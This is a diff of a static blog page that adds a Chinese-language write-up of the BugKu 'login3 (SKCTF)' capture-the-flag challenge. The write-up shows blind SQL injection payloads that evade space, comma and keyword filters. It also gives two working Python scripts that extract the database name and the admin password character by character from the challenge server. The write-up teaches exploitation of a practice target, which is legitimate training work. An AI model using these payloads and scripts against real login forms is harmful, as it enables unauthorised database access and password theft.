@@ -286,6 +286,156 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/30/BugKu-login3-SKCTF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="新先生">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="新先生">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/30/BugKu-login3-SKCTF/" itemprop="url">BugKu--login3(SKCTF)</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-30T14:35:03+08:00">
+                2019-07-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+          
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>看到一个登陆框 ，首先用admin+万能密码登陆，发现提示密码错误证明用户名是正确的。所以我们开始注入：<br>首先我们输入admin’:<br><a href="http://i2.tiimg.com/695378/b7fb5ee5afa4b499.png" target="_blank" rel="noopener">http://i2.tiimg.com/695378/b7fb5ee5afa4b499.png</a><br>输入admin ‘#，提示密码错误，输入admin’ #,提示非法字符，一看就是过滤了空格，我们单独输入and、union、select、for、from,发现过滤了and、union、for字符。<br><strong>接着我们就需要绕过过滤字符：</strong></p>
+<p><strong>括号绕过空格：</strong></p>
+<p>如果空格被过滤，括号没有被过滤，可以用括号绕过。</p>
+<p>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p>
+<p>例如：</p>
+<figure class="highlight plain"><figcaption><span>dual where(1</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这种过滤方法常常用于time based盲注,例如：</span><br><span class="line"></span><br><span class="line">```?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</span><br></pre></td></tr></table></figure>
+
+<p><strong>逗号绕过（使用from或者offset）：</strong></p>
+<p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</p>
+<figure class="highlight plain"><figcaption><span>substr(database() from 1 for 1);```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">```select mid(database() from 1 for 1);</span><br></pre></td></tr></table></figure>
+
+<p><strong>等于号=：</strong><br>用&lt;&gt;(不等于)绕过。</p>
+<p>按照以上思路我们使用：</p>
+<figure class="highlight plain"><figcaption><span>from 1 for 1))```,但是我们发现for也被过滤了。我们发现mysql用ascii的参数是一个字符串时，会只计算字符串第一位的ascii值。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">http://i1.fuimg.com/695378/1b7736f50af37534.png</span><br><span class="line">如图所示，语句```ascii(substr(database()from(1)))```就可以输出数据库名第一位的ascii值</span><br><span class="line"></span><br><span class="line">那么思路就很清晰了，根据输入```admin&apos;^(ascii(substr(database()from(数字1)))&lt;&gt;数字2)#```，根据返回的信息，如果返回了&quot;password error!&quot; ，说明数字2就是数据库的第一位(数字1)的ascii值，为什么这么说呢？admin用户存在，返回1。数字二等于数字一。后面的语句返回0，即1 ^0返回1。说明用户输入栏正确，所以返回password错误。</span><br><span class="line">我们写脚本爆出数据库：</span><br><span class="line">```python</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &apos;http://118.89.219.210:49167/index.php&apos;</span><br><span class="line">all_string = &apos;&apos;&apos;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&apos;&apos;&apos;</span><br><span class="line">database = &apos;&apos;</span><br><span class="line">for i in range(1,11):</span><br><span class="line">    for j in all_string:</span><br><span class="line">        print(&apos;checking &apos;+j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            &apos;username&apos;:&quot;admin&apos;^(ascii(substr(database()from(%d)))&lt;&gt;%d)#&quot;%(i,ord(j)),</span><br><span class="line">            &apos;password&apos;:&apos;1&apos;,</span><br><span class="line">            &apos;submit&apos;:&apos;Log In&apos;</span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        if &apos;password error!&apos; in r.text:</span><br><span class="line">            database = database + j</span><br><span class="line">            print(&apos;the &apos;+str(i)+&apos; place of database is &apos;+j)</span><br><span class="line">            break</span><br><span class="line">    if j == &apos;M&apos; and &apos;username does not exist!&apos; in r.text:</span><br><span class="line">        break</span><br><span class="line">print(database)</span><br></pre></td></tr></table></figure>
+
+<p><a href="http://i2.tiimg.com/695378/0853845ddf830fa6.png" target="_blank" rel="noopener">http://i2.tiimg.com/695378/0853845ddf830fa6.png</a><br>本来按这个思路可以继续注表名的，但是发现information被过滤了，无奈，表和列名好像只能靠猜</p>
+<p>看别人猜的表名为admin，列名为password，真是玄学…</p>
+<p>那就直接爆password：<br>接着们爆出表：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://123.206.31.85:49167/index.php'</span></span><br><span class="line">all_string = <span class="string">'''1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">password = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_string:</span><br><span class="line">        print(<span class="string">'checking '</span>+j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>:<span class="string">"admin'^(ascii(substr((select(password)from(admin))from(%d)))&lt;&gt;%d)#"</span>%(i,ord(j)),</span><br><span class="line">            <span class="string">'password'</span>:<span class="string">'1'</span>,</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Log In'</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'password error!'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            password = password + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of password is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> j == <span class="string">'M'</span> <span class="keyword">and</span> <span class="string">'username does not exist!'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(password)</span><br></pre></td></tr></table></figure>
+
+<p><a href="http://i1.fuimg.com/695378/2087571c3e5752d6.png" target="_blank" rel="noopener">http://i1.fuimg.com/695378/2087571c3e5752d6.png</a><br>我们可以看出爆出了密码，解密skctf123456。</p>
+<p>补充一下知识点：<br>1.ord()函数主要用来返回对应字符的ascii码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ord(<span class="string">"a"</span>)</span><br><span class="line"><span class="number">97</span></span><br><span class="line">&gt;&gt;&gt; chr(<span class="number">97</span>)</span><br><span class="line">&gt; <span class="string">'a</span></span><br></pre></td></tr></table></figure>
+
+<p>打印字符串</p>
+<p><code>print (“His name is %s”%(“Aviad”))</code></p>
+<p>效果：<br><a href="http://i2.tiimg.com/695378/9cef5b2b60efb76b.png" target="_blank" rel="noopener">http://i2.tiimg.com/695378/9cef5b2b60efb76b.png</a><br>打印整数</p>
+<p>print (“He is %d years old”%(25))</p>
+<p>效果：<br><a href="http://i2.tiimg.com/695378/e9ece54b012a24a4.png" target="_blank" rel="noopener">http://i2.tiimg.com/695378/e9ece54b012a24a4.png</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/29/python-scoket主机识别/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -919,7 +1069,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -941,7 +1091,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
